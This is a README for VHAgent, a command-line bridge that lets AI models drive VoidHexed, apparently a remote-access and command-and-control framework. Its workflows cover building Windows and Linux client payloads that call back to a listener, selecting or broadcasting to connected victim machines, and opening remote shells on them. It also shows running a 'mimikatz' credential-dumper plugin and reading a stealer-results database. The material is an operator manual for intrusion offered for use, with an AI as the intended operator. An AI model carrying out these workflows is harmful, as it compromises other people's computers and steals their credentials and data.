# VHAgent — AI Interface to VoidHexed

VHAgent is a native CLI tool that lets AI models programmatically control a running VoidHexed instance over local IPC. It exposes every VoidHexed feature — client management, command execution, server control, database queries, plugin management, and real-time event streaming — through a structured JSON interface.

**Transport:** Named pipes (`VoidHexed.Agent`). Works on Windows and Linux (.NET uses Unix domain sockets on Linux: `/tmp/CoreFxPipe_VoidHexed.Agent`).

**Prerequisite:** VoidHexed must be running. VHAgent connects to it as a local IPC client.

---

## Quick Start

```bash
# Check connection
VHAgent ping

# List all connected clients
VHAgent list-clients

# Execute any VoidHexed command
VHAgent exec "select 192.168.1.10" --wait 0   # sync command, skip wait
VHAgent exec "cpu"                              # waits up to 5s for client response
VHAgent exec "cpu" --wait 10000                 # custom wait: 10 seconds
VHAgent exec "shellcmd ping 1.2.3.4" --wait 15000 --idle 2000  # bursty output: 2s idle
VHAgent exec "server start MyServer 4443"

# Query database
VHAgent db events --filter 192.168 --limit 10

# Stream real-time events
VHAgent subscribe client_connected,client_disconnected,log

# Pipe raw JSON (for programmatic use)
echo '{"method":"exec","params":{"command":"cpu","wait_ms":5000}}' | VHAgent

# Interactive REPL
VHAgent -i
```

---

## Usage Modes

### 1. CLI Shorthand (recommended for AI)

```
VHAgent <command> [args]
```

Single command, JSON response on stdout, exit code indicates success/failure. Best for scripted AI workflows.

### 2. Stdin JSON Pipe

```
echo '{"method":"...","params":{...}}' | VHAgent
```

Send one or more JSON request objects (one per line) via stdin. Each gets a JSON response line on stdout. Useful when the AI needs to construct arbitrary requests.

### 3. Interactive REPL

```
VHAgent -i
```

Persistent connection with prompt. **Auto-subscribes to `log` and `server_log` events on connect**, so shell output and command results stream in real-time between prompts — no manual `subscribe` needed. Supports all CLI commands plus live event display.

---

## CLI Commands

| Command | IPC Method | Description |
|---------|------------|-------------|
| `ping` | `ping` | Version, uptime, session start time |
| `list-clients` | `list_clients` | All connected clients with full metadata |
| `list-selected` | `list_selected` | Currently selected clients |
| `list-servers` | `list_servers` | Active listeners (port, label, client count) |
| `stats` | `get_stats` | Network stats, connection counts, OS distribution |
| `settings` | `get_settings` | Current configuration (certs, tasks, theme, firewall) |
| `plugins` | `list_plugins` | Loaded plugins (id, version, status, formats) |
| `firewall` | `get_firewall` | Firewall policy + all rules with hit counts |
| `exec <cmd> [--wait ms] [--idle ms]` | `exec` | Execute any VoidHexed command (wait: 5000, idle: 1000) |
| `db stats` | `db_stats` | Row counts per database table |
| `db events` | `db_events` | Connection event history |
| `db builds` | `db_builds` | Build history |
| `db stealer` | `db_stealer` | Stealer results |
| `db hits` | `db_hits` | Firewall hit log |
| `db clear <table>` | `db_clear` | Clear a database table |
| `subscribe <events>` | `subscribe` | Stream events (comma-separated) |

### DB Command Options

| Flag | Applies to | Description |
|------|-----------|-------------|
| `--limit N` | events, builds, stealer, hits | Max rows (default: 50) |
| `--filter X` | events | Filter by IP/HWID/username substring |
| `--ip X` | stealer | Filter by client IP |
| `--rule X` | hits | Filter by firewall rule name |

---

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Connection error (VoidHexed not running or pipe timeout) |
| 2 | Command error (bad method, missing params, server-side error) |

---

## Protocol

Line-delimited JSON over named pipe `VoidHexed.Agent`. Three message types:

### Request (VHAgent -> VoidHexed)
```json
{"type":"request","id":"1","method":"list_clients","params":{}}
```

### Response (VoidHexed -> VHAgent)
```json
{"type":"response","id":"1","ok":true,"data":{...}}
```

### Event (VoidHexed -> VHAgent, after subscribing)
```json
{"type":"event","event":"client_connected","data":{...}}
```

All output goes to **stdout** as JSON. Human-readable messages (prompts, errors) go to **stderr**.

---

## Response Schemas

### ping
```json
{
  "ok": true,
  "data": {
    "version": "0.9.5.0",
    "uptime": "2h 15m 30s",
    "started": "2026-04-05T14:00:00.0000000+02:00"
  }
}
```

### list_clients
```json
{
  "ok": true,
  "data": {
    "count": 3,
    "clients": [
      {
        "ip": "192.168.1.10",
        "hwid": "ABC123...",
        "os": "Windows 10 Pro 22H2",
        "username": "admin",
        "country": "US",
        "region": "NA",
        "privilege": "Admin",
        "platform": "WINDOWS",
        "serverPort": 4443,
        "note": "",
        "connectedAt": "2026-04-05T14:30:00.0000000+02:00",
        "lastSeen": "2026-04-05T16:15:00.0000000+02:00"
      }
    ]
  }
}
```

### list_selected
Same schema as `list_clients`. Returns only the clients currently selected in the UI.

### list_servers
```json
{
  "ok": true,
  "data": {
    "count": 1,
    "servers": [
      { "port": 4443, "label": "Main", "clientCount": 3 }
    ]
  }
}
```

### get_stats
```json
{
  "ok": true,
  "data": {
    "bytesSent": 1048576,
    "bytesRecv": 524288,
    "bytesSentFmt": "1.00 MB",
    "bytesRecvFmt": "512.00 KB",
    "txRate": 1024,
    "rxRate": 512,
    "txRateFmt": "1.00 KB/s",
    "rxRateFmt": "512 B/s",
    "activeClients": 3,
    "peakConcurrent": 5,
    "totalConnected": 12,
    "totalDisconnected": 9,
    "commandsSent": 45,
    "packetsReceived": 230,
    "activeServers": 1,
    "uptime": "2h 15m 30s",
    "sessionStart": "2026-04-05T14:00:00.0000000+02:00",
    "osDistribution": { "windows": 2, "linux": 1 },
    "privilegeDistribution": { "admin": 1, "user": 2 },
    "uniqueCountries": 2,
    "connectionRate": 5.33,
    "lastClient": {
      "ip": "192.168.1.10",
      "user": "admin",
      "os": "Windows 10",
      "country": "US",
      "privilege": "Admin",
      "time": "2026-04-05T16:10:00.0000000+02:00"
    }
  }
}
```

### exec
```json
{
  "ok": true,
  "data": {
    "output": [
      "[16:15:30] [AI] > cpu",
      "[16:15:30] Sending CPU request...",
      "[16:15:31] CPU: Intel Core i7-12700K @ 3.60GHz (12C/20T)"
    ],
    "durationMs": 1250
  }
}
```

`output` is an array of log lines captured during command execution. Each line is timestamped. Commands sent through VHAgent are prefixed with `[AI]` in the log (e.g., `[AI] > cpu`) so the operator can distinguish them from manual commands.

**Async result capture:** After the command is dispatched, `exec` waits for async client responses. Two timeouts control this:

- **`wait_ms`** (default: 5000) — hard deadline: maximum total time to wait for output.
- **`idle_ms`** (default: 1000) — idle window: if no new output arrives within this window, `exec` returns early. Each received line resets the idle timer.

Use `wait_ms: 0` for sync-only commands (e.g., `select`, `server start`) to skip the wait. For **bursty commands** like `shellcmd ping` (output arrives in ~1-second intervals), increase `idle_ms` to avoid cutting off between bursts:

```
VHAgent exec "shellcmd ping 192.168.1.1" --wait 15000 --idle 2000
```

**Request with wait_ms and idle_ms:**
```json
{"type":"request","id":"1","method":"exec","params":{"command":"cpu","wait_ms":5000,"idle_ms":1000}}
```

### get_settings
```json
{
  "ok": true,
  "data": {
    "hasCa": true,
    "serverCerts": [{ "label": "Main", "port": 4443, "autoListen": true }],
    "clientCerts": [{ "label": "Default" }],
    "tasks": [
      {
        "label": "AutoShell",
        "serverPort": 4443,
        "remoteHost": "*",
        "command": "shell",
        "clientTarget": "Windows",
        "enabled": true
      }
    ],
    "theme": "dark",
    "themeColor": "blue",
    "firewallPolicy": "allow",
    "heartbeatTimeout": 30,
    "rateLimitMax": 100,
    "rateLimitWindow": 60
  }
}
```

### list_plugins
```json
{
  "ok": true,
  "data": {
    "count": 2,
    "plugins": [
      {
        "id": "mimikatz",
        "version": "1.0.0",
        "author": "user",
        "desc": "Credential dumper",
        "mode": "once",
        "status": "idle",
        "formats": ["win_dll", "win_coff"]
      }
    ]
  }
}
```

### get_firewall
```json
{
  "ok": true,
  "data": {
    "policy": "allow",
    "rules": [
      {
        "name": "Block Scanner",
        "action": "deny",
        "target": "IP",
        "value": "10.0.0.0/8",
        "matchMode": "cidr",
        "enabled": true,
        "hitCount": 42
      }
    ]
  }
}
```

### db_stats
```json
{
  "ok": true,
  "data": {
    "connectionEvents": 150,
    "firewallHits": 42,
    "buildHistory": 8,
    "stealerResults": 23,
    "asmSamples": 5
  }
}
```

### db_events / db_builds / db_stealer / db_hits
```json
{
  "ok": true,
  "data": {
    "rows": [ ... ]
  }
}
```
Rows are arrays of objects — schema depends on the SQLite table. Use `db stats` first to check if data exists.

### db_clear
```json
{
  "ok": true,
  "data": { "cleared": "connection_events" }
}
```
Valid table names: `events`/`connection_events`, `hits`/`firewall_hits`, `builds`/`build_history`, `stealer`/`stealer_results`, `asm`/`asm_samples`.

### Error response
```json
{
  "ok": false,
  "error": "Missing 'command' parameter"
}
```

---

## Events

Subscribe to real-time events with `VHAgent subscribe <event1,event2,...>`.

| Event | Fired when | Data |
|-------|-----------|------|
| `client_connected` | A client connects | `{ip, hwid, os, username, country, privilege, platform, serverPort}` |
| `client_disconnected` | A client disconnects | `{ip, hwid}` |
| `log` | Command log output is written | `{message, source}` |
| `server_log` | Server log output is written | `{message}` |

Event format:
```json
{"type":"event","event":"client_connected","data":{"ip":"192.168.1.10","hwid":"ABC123","os":"Windows 10","username":"admin","country":"US","privilege":"Admin","platform":"WINDOWS","serverPort":4443}}
```

---

## Common AI Workflows

### Enumerate and interact with clients
```bash
# 1. Check what's connected
VHAgent list-clients

# 2. Select a client by IP:Port (sync — use --wait 0)
VHAgent exec "select 192.168.1.10:54321" --wait 0

# 3. Run commands on the selected client (async — waits for response)
VHAgent exec "cpu"
VHAgent exec "module"
VHAgent exec "pebinfo"
VHAgent exec "ksharedinfo"

# 4. Shell session
VHAgent exec "shell"                                           # open CMD
VHAgent exec "shellcmd ipconfig" --wait 5000                   # run command
VHAgent exec "shellcmd ping 192.168.1.1" --wait 15000 --idle 2000  # bursty output
VHAgent exec "shellend" --wait 0                               # close shell
```

### Server management
```bash
# Start a listener
VHAgent exec "server start MainServer 4443"

# Check active servers
VHAgent list-servers

# Stop a listener
VHAgent exec "server stop 4443"
```

### Build a client payload
```bash
VHAgent exec "build 192.168.1.100 4443 myclient w"   # Windows
VHAgent exec "build 192.168.1.100 4443 myclient l"   # Linux
```

### Monitor activity
```bash
# Stream all events
VHAgent subscribe client_connected,client_disconnected,log,server_log

# Check historical connections
VHAgent db events --limit 20
```

### Multi-client operations
```bash
# Select multiple clients by IP:Port
VHAgent exec "select 192.168.1.10:54321 192.168.1.11:54322" --wait 0

# Run on all selected
VHAgent exec "cpu"

# Or broadcast to ALL connected clients (ignores selection)
VHAgent exec "broadcast cpu"
```

### Configuration
```bash
# View current config
VHAgent settings

# Manage certificates
VHAgent exec "cfg ca create mypassword" --wait 0
VHAgent exec "cfg servercert create myserver mypassword 4443 1" --wait 0
VHAgent exec "cfg clientcert create myclient mypassword" --wait 0

# Auto-connect tasks
VHAgent exec "cfg task add AutoShell 4443 * win cpu" --wait 0

# Firewall
VHAgent firewall
VHAgent exec "firewall add BlockRange deny cidr 10.0.0.0/8" --wait 0
```

### Plugin management
```bash
VHAgent plugins
VHAgent exec "plugin load /path/to/plugin.vhp"
VHAgent exec "plugin run mimikatz"
VHAgent exec "plugin unload mimikatz"
```

---

## Important Notes

- **`exec` is your universal command.** Any VoidHexed command you'd type in the UI command bar works through `exec`. The `output` array in the response contains the captured log lines — this is how you read results.
- **Async results are captured automatically.** `exec` waits up to `wait_ms` (default 5000ms) with an `idle_ms` (default 1000ms) idle window. Use `--wait 0` for sync-only commands. Use `--idle 2000` (or higher) for bursty commands like `ping` where output arrives in intervals exceeding 1 second.
- **Interactive mode (`-i`) streams output in real-time.** The REPL auto-subscribes to `log` and `server_log` events, so shell output prints between prompts without relying on `exec` capture. Best for interactive exploration and long-running shell sessions.
- **`[AI]` prefix in UI log.** Commands sent through VHAgent appear as `[AI] > cpu` in VoidHexed's log, distinguishing them from manually typed commands.
- **Selection state is persistent.** `exec "select ..."` changes which clients receive subsequent commands. Use `list-selected` to check current selection.
- **One agent at a time.** The IPC server accepts a single connection. If another agent connects, the previous one is disconnected.
- **All output is JSON on stdout.** Parse the `ok` field first. If `false`, check `error`. Human-readable text only appears on stderr.
- **Commands are case-insensitive.** `VHAgent PING`, `VHAgent Ping`, `VHAgent ping` all work.
- **Platform field:** Client `platform` is `"WINDOWS"` or `"LINUX"`.
- **Timestamps** are ISO 8601 with timezone offset.
- **`proxy recon` is Windows-only.** `proxy start/stop/list/connections` work on both Windows and Linux clients. Only `proxy recon` requires a Windows client (uses Registry + iphlpapi.dll).

---

## Architecture

```
AI Model
  |
  v
VHAgent (native CLI, AOT-compiled)
  |  named pipe: VoidHexed.Agent
  v
AgentIpcServer (in VoidHexed process)
  |
  v
AgentIpcHandler --> MainUIArg.Parser()  (command execution)
                --> MainUI._clients     (client state)
                --> ServerStats          (network metrics)
                --> VoidDb               (SQLite queries)
                --> PluginRegistry       (plugin state)
                --> Program.GlobalObject (servers, settings)
```

VHAgent is a thin client — all logic runs inside VoidHexed. Synchronous log output is captured via `AsyncLocal<List<string>>`. Async results (client responses arriving after command dispatch) are captured via a global `Channel<string>` with a configurable idle timeout (`idle_ms`, default 1s), so `exec` returns both immediate and delayed output.

---

## Files

| File | Role |
|------|------|
| `VHAgent/Program.cs` | CLI entry: mode selection, command parsing, REPL |
| `VHAgent/IpcClient.cs` | Named pipe client, request/response correlation, event reception |
| `VHAgent/Protocol.cs` | IPC message types (AOT-compatible JSON source gen) |
| `VoidHexed/Network/AgentIpcServer.cs` | Pipe server lifecycle, read/write loops, event channel |
| `VoidHexed/Network/AgentIpcHandler.cs` | Request dispatcher, maps IPC methods to VoidHexed APIs |
